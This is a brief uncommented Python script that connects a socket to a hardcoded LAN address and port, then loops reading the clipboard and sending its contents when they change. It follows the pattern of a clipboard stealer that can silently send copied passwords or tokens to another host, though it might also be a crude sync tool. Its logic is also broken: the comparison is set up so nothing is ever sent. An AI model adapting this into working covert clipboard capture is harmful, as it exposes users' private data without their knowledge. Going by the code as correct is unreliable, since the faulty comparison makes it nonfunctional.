import socket
import time
import pyperclip as pp
c=socket.socket()
c.connect(('192.168.1.89',9989))
while True:
    clip=pp.paste()
    newclip=clip
    if(clip!=newclip):
        c.send(bytes(newclip,'utf-8'))
    newclip=pp.paste()
    